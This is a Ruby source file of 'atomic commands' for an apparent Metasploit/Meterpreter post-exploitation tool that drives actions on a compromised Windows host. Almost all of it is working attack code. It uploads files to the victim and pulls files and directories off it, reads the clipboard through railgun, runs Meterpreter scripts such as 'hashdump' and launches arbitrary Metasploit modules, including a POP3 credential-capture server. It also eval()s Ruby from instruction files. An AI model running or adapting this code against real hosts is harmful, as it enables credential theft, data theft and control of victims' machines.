##############################################################################
#
# The contents of this file are subject to the Mozilla Public License
# Version 1.1 (the "License"); you may not use this file except in
# compliance with the License. You may obtain a copy of the License at
# http://www.mozilla.org/MPL/
#
# Software distributed under the License is distributed on an "AS IS"
# basis, WITHOUT WARRANTY OF ANY KIND, either express or implied. See the
# License for the specific language governing rights and limitations
# under the License.
#
# The Original Code is developed by Dreamlab Technologies and the team from
# remote-exploit.org. Copyright (C) 2008-2010 All Rights Reserved.
#
# Contributor(s) are referenced within the sourcecode.
#
##############################################################################
#
# = Atomic commands
# Atomic commands are commands wich don't have any dependency other than the
# meterpreter.
#
##############################################################################

##############################################################################
# == local_ruby(code)
# This command executes ruby code directly from the instruction file.
# <b>DON'T USE IT!</b>
##############################################################################
def local_ruby(code)
  return if code == nil
  begin
    eval(code)
  rescue ::Exception=>e
    print_status "eval(): Unable to eval the code provided: #{code}: #{e.to_s}"
  end
end


##############################################################################
# == local_msf_aux(args)
# This command executes a given module of metasploit
# 
##############################################################################
def local_msf_aux(args)
  return if args == nil
  args=args.split
  begin
    if ((mod = @framework.modules.create(args[0]))== nil)
	    raise "Could not load or find the module #{args[0]} mod was #{mod.inspect}"
    end
	args[1 .. -1].each do |elem|
		if elem.index('=') != nil
			var = elem[0 .. elem.index("=")-1]
			value = elem[elem.index("=")+1 .. -1]
			mod.datastore.merge!({"#{var}" => "#{value}"})
		end
	end
	mod.datastore.merge!({"raw_dir" => "#{@sessionData['raw_dir']}"})
	mod.datastore.merge!({"remote_work_dir" => "#{@sessionData['remote_work_dir']}"})
	mod.datastore.merge!({"ins_dir" => "#{@sessionData['ins_dir']}"})

	print_status("Calling the metasploit modlue #{args[0]} now")

	mod.run_simple(
			'LocalOuput' => @sessionData['LocalOutput'],
			'LocalInput' => @sessionData['LocalInput']

			)
	#@framework.jobs.each do |job|
	#	puts "the job id #{job[1].jid.to_s} is #{job[1].name}\n" 
	#end

  rescue ::Exception=>e
    print_error "local_msf_aux(): Unable to exute the give msf modules: #{args}: #{e.to_s}"
  end
end # end local_msf_aux

##############################################################################
# == local_msf_jobkillall_name(nametokill)
# This command is used to terminate ALL jobs matching the given name 
# within metasploit. Dont use this if you dont have to :-)
# 
# === Syntax
# [+nametokill+] name of the module to kill
# === Usage example
#  local_msf_jobkillall_name("auxiliary/server/capture/pop3")
##############################################################################
def local_msf_jobkillall_name(nametokill)

	# Get the list of jobs and compare to name
	@framework.jobs.each do |job|
		
		if job[1].name.sub!(/Auxiliary: /,'') == nametokill.sub!(/auxiliary\//,'')
			print_status("Killing the job id:#{job[1].jid.to_s} name:#{job[1].name}")
			@framework.jobs.stop_job(job[1].jid.to_s)
		end
	end
end # end local_msf_jobkillall_name

##############################################################################
# == local_sleep(sec)
# This command is used to let the server thread sleep for some time specified
# in seconds.
# === Syntax
# [+sec+] number of seconds to sleep. If you ommit this argument it sleeps for 5 seconds.
# === Usage example
#  local.sleep(3)
#  l.sleep(10)
##############################################################################
def local_sleep(sec)
  begin
    if sec == nil
      select(nil, nil, nil, 5) # sleeps on default 5 secs
    else
      # sleep args[0].to_s.to_i
      select(nil, nil, nil, sec.to_i)
    end
  rescue ::Exception=>e
    print_error("wait(): Unable to sleep for #{args[0].to_s.to_i} seconds: #{e.to_s}")
  end
end # wait

##############################################################################
# == local_logger(message)
# This command logs a custom status message to the carat console and logfile from
# within the instruction file. It uses the print_status() function.
#
# === Syntax
# [+message+] Specifies the log message
#
# === Usage example
#  local.logger("This messages comes directly from the instruction file")
#  l.logger("Hy there")
##############################################################################
def local_logger(message)
  return if message == nil
  begin
    print_status(message)
  rescue ::Exception=>e
    print_status "local_logger(): This is realy not good... We are logging that we cant log?!"
  end
end

##############################################################################
# == local_upload(src,dst,[nooverwrite]) - sends a file to the remote host
# This command uploads a file from the server to the client. It first checks
# the existance of the file localy. Then it checks if the file already exists
# on the remote system. The destination file gets overwriten by default. If you
# dont like this behavior then you can specify the optional parameter "nooverwrite".
# Then the file gets uploaded. After that it checks again if the file exists on
# the remote system. Otherwise it raises an error.
#
# === Syntax
# [+src+] Specifies the source file
# [+dst+] Specifies the destination file
# [+nooverwrite+] If a third argument exists then the file don't gets overwriten if the file already exists on the system
#
# === Path substitution
#  ___BASE___
# This keyword gets substituted depending on the scope.
# [+src+] Substituded with <tt>@sessionData['ins_dir']</tt> which is the job directory
# [+dst+] Substituted with <tt>@sessionData['remote_work_dir']</tt> which is the <tt>%TEMP%</tt> on the target system
#
# === Usage example
#  local.upload("___BASE___/upload/test.txt","___BASE___/upload/test.txt")
#  local.upload("/etc/hosts","c:/test.txt")
##############################################################################
def local_upload(src,dst,overwrite="yes")

  # return if we dont have src and dst
  return false if src == nil or dst == nil

  begin

    # replace $BASE$ in src with @sessionData["inputdir"]
    src = src.gsub(/___BASE___/,  @sessionData['ins_dir'])

    # replace $BASE$ in dst with @sessionData['remote_work_dir']
    dst = dst.gsub(/___BASE___/, @sessionData['remote_work_dir'])

    # Check if the src file exist (abort if it does not exist)
    if File.exists?("#{src}") == false
      print_error("local_upload(): Source file does not exist: #{src}!")
      return false
    end

    # check if the dst file exist (abort if nooverwrite flag is set)
    if overwrite=="no" and remote_exist(dst)
      print_error("local_upload(): Destination file already exists and will not be overwritten: #{dst}!")
      return false
    else
      # Do the upload
      @sessionData["session"].fs.file.upload_file("#{dst}", "#{src}")
      # Check if the file gots uploaded successfuly.
      # TODO: implement md5sum to see if the file has the intended content
      if remote_exist(dst)
        print_good("local_upload(): File #{src} uploaded sucessfully to #{dst}")
        return true
      else
        print_error("local_upload(): Upload of #{src} to #{dst} was not successfull!")
        return false
      end
    end
  rescue ::Exception => e
    print_error("local_upload(): exception #{e.to_s}: #{e}")
    return false
  end
end

##############################################################################
# == local_dir_download(src,dest,recursive) - downloads a dir from the remote host

#
# === Syntax
# [+src+] Specifies the source dir
# [+dst+] Specifies the destination dir
# [+recursive+] Specifies wherever it should be copied with recursion
#
# === Path substitution
#  ___BASE___
# This keyword gets substituted depending on the scope.
# [+src+] Substituded with <tt>@sessionData['remote_work_dir']</tt> which is the <tt>%TEMP%</tt> directory
# [+dst+] Substituted with <tt>@sessionData["outputdir"]</tt> which is the log on the target system
#
# === Usage example
#  local.download("___BASE___/test.txt","___BASE___/test.txt")
#  local.download("c:\boot.ini","/tmp/boot.ini")
##############################################################################
def local_dir_download(src,dst,recursion=true)
    # replace $BASE$ in src with @sessionData["inputdir"]
    src = src.gsub(/___BASE___/,  @sessionData['remote_work_dir'])

    # replace $BASE$ in dst with @sessionData['remote_work_dir']
    dst = dst.gsub(/___BASE___/, @sessionData['raw_dir'])
	
	test=@sessionData["session"].fs.dir.download(dst,src,true) { |step, src, dst|
		 print_status("#{step.ljust(11)}: #{src} -> #{dst}")
		}
end

##############################################################################
# == local_download(src,dst,[nooverwrite]) - downloads a file from the remote host
# This command downloads a file from the client to the server. It first checks
# the existance of the remote file. Then it checks if the file already exists
# on the local system. The destination file gets overwriten by default. If you
# dont like this behavior then you can specify the optional parameter "nooverwrite".
# Then the file gets downloaded. After that it checks again if the file exists on
# the local system. Otherwise it raises an error.
#
# === Syntax
# [+src+] Specifies the source file
# [+dst+] Specifies the destination file
# [+nooverwrite+] If a third argument exists then the file don't gets overwriten if the file already exists on the system
#
# === Path substitution
#  ___BASE___
# This keyword gets substituted depending on the scope.
# [+src+] Substituded with <tt>@sessionData['remote_work_dir']</tt> which is the <tt>%TEMP%</tt> directory
# [+dst+] Substituted with <tt>@sessionData["outputdir"]</tt> which is the log on the target system
#
# === Usage example
#  local.download("___BASE___/test.txt","___BASE___/test.txt")
#  local.download("c:\boot.ini","/tmp/boot.ini")
##############################################################################
def local_download(src,dst,overwrite="yes")

  # return if we dont have src and dst
  return false if src == nil or dst == nil

  begin
    # replace $BASE$ in src with @sessionData["inputdir"]
    src = src.gsub(/___BASE___/,  @sessionData['remote_work_dir'])

    # replace $BASE$ in dst with @sessionData['remote_work_dir']
    dst = dst.gsub(/___BASE___/, @sessionData['raw_dir'])

    # Check if the src file exist (abort if it does not exist)
    if remote_exist("#{src}") == false
      print_error("local_download(): Source file does not exist: #{src}!")
      return false
    end

    # check if the dst file exist (abort if nooverwrite flag is set)
    if overwrite=="no" and File.exists?(dst)
      print_error("local_download(): Destination file already exists and will not be overwritten: #{dst}!")
      return false
    else
      # Do the upload
      @sessionData["session"].fs.file.download_file("#{dst}", "#{src}")
	  sleep (2)
      # Check if the file gots uploaded successfuly.
      # TODO: implement md5sum to see if the file has the intended content
      if File.exists?(dst)
        print_good("local_download(): File #{src} downloaded sucessfully to #{dst}")
        #return true
      else
        print_error("local_download(): Download of #{src} to #{dst} was not successfull!")
        #return false
      end
    end
  rescue ::Exception => e
    print_error("local_download(): exception #{e.to_s}")
    #return false
  end
end

def remote_get_clipboard(filename)
  if filename == nil 
    return
  end
  begin
    # First string is message and second string is the title of the window
    #client.railgun.multi( ["kernel32", "ExitProcess", [0]], ["kernel32", "ExitProcess", [0]] )
	#testme=@sessionData["session"].railgun.user32.OpenClipboard(0)
	r=@sessionData["session"].railgun.multi([["user32","OpenClipboard",[0]],["user32","GetClipboardData",["CF_TEXT"]]])
    #puts "------------returnvalues  #{testme["GetLastError"]} and #{testme["return"]}>>>> #{testme} #{testme.inspect}"
    #sleep(5)
	#handle=@sessionData["session"].railgun.user32.GetClipboardData("CF_TEXT")
    #puts "------------handle returnvalues  #{r.inspect}"


#	testme2=@sessionData["session"].railgun.user32.CloseClipboard()
  #  puts "------------returnvalues  #{testme["GetLastError"]} and #{testme["return"]}>>>> #{testme} #{testme.inspect}"

  rescue ::Exception=>e
    print_status "railgun(): An error took plase: #{e.to_s}"
  end
end # end remote messageboxa



##############################################################################
# == remote_MsgboxA(message,title)
# This commands creates a message box on the remote host with a OK button and
# the message and title supplied by the arguments. Please be aware that this
# function is blocking (somehow). The program continues after a timeout (TODO 10 sec?).
#
# === Syntax
# [+message+] Message displayed within the message box.
# [+title+] Title of the message box.
#
# === Usage example
#  remote.msgbox("This is my important message","First Notification Window")
#  r.msgbox("This is my important message","First Notification Window")
#  msgbox("This is my important message","First Notification Window")
##############################################################################
def remote_MsgboxA(message,title)
  if message == nil or title == nil
    return
  end
  begin
    # First string is message and second string is the title of the window
    testme=@sessionData["session"].railgun.user32.MessageBoxA(0,"#{message}","#{title}","MB_OK")
    #puts "------------returnvalues  #{testme["GetLastError"]} and #{testme["return"]}>>>> #{testme} #{testme.inspect}"
  rescue ::Exception=>e
    print_status "railgun(): An error took plase, messagebox with the message #{message}: #{e.to_s}"
  end
end # end remote messageboxa

##############################################################################
# == local_executescript(script,args)
# This command executes the given meterpreter script

#
# === Syntax
# [+script+] The script to be executed
# [+args+] Related arguments (Optional)
#
# === Usage example
#  local.executescript("hashdump")
##############################################################################
def local_executescript(script,args="")
  @sessionData["session"].execute_script(script,args)
end # end remote_executescript


##############################################################################
# == remote_exist(file)
# This command check the existance of a file or directory on the remote system.
# If the file exists it returns 1, otherwise it returns 0. It uses the meterpreter function:
#  @sessionData["session"].fs.file.stat(file).ftype()
# To determine if the file exists
#
# === Syntax
# [+file+] File or directory to check
#
# === Usage example
#  remote.exist("c:\boot.ini")
#  r.exist("c:\boot.inixxx")
#  exist("c:\windows")
#  r.exist("c:\windowsxxx")
##############################################################################
def remote_exist(file)
  begin
    if file == nil or file == ""
      print_error ("fileexists: No arguments passed")
      return nil
    end
    if @sessionData["session"].fs.file.stat(file).ftype()
      return true
    end
  rescue ::Exception=>e
    if e.to_s =="stdapi_fs_stat: Operation failed: 2"
      return false
    else
      print_error("remote_exists(): error during existance check of #{file}! with error message: #{e.to_s}")
      return nil
    end
  end #
end # fileexists
